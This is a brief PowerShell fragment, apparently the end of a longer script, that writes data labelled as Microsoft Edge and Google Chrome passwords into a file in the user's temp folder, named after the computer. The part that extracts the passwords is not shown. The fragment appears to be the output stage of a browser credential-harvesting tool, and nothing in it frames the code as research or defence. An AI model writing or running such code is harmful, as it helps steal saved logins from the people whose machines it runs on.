...
$outputFile = "$env:TEMP\${computer}_passwords_$timestamp.txt"

"=== MICROSOFT EDGE ===" | Out-File $outputFile -Encoding UTF8
$edgeData | Out-File $outputFile -Encoding UTF8 -Append
"`n=== GOOGLE CHROME ===" | Out-File $outputFile -Encoding UTF8 -Append
$chromeData | Out-File $outputFile -Encoding UTF8 -Append
